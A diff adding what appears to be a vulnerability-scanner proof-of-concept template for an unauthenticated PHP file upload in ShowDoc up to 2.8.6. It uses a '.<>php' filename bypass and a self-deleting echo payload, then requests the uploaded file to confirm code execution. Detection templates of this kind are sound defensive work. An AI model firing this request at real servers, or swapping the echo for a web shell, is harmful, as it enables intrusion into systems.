@@ -1,0 +1,25 @@
+name: poc-yaml-showdoc-uploadfile
+set:
+  r1: randomLowercase(4)
+  r2: randomLowercase(4)
+rules:
+  - method: POST
+    path: /index.php?s=/home/page/uploadImg
+    headers:
+      Content-Type: "multipart/form-data; boundary=--------------------------835846770881083140190633"
+    follow_redirects: false
+    body: "----------------------------835846770881083140190633\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"{{r1}}.<>php\"\nContent-Type: text/plain\n\n<?php echo \"{{r2}}\"; unlink(__FILE__); ?>\n----------------------------835846770881083140190633--"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"success")
+    search: |
+      (?P<date>\d{4}-\d{2}-\d{2})\\/(?P<file>[a-f0-9]+\.php)
+  - method: GET
+    path: /Public/Uploads/{{date}}/{{file}}
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(r2))
+detail:
+  author: White(https://github.com/WhiteHSBG)
+  Affected Version: "showdoc <= 2.8.6"
+  links:
+    - https://github.com/star7th/showdoc/pull/1059
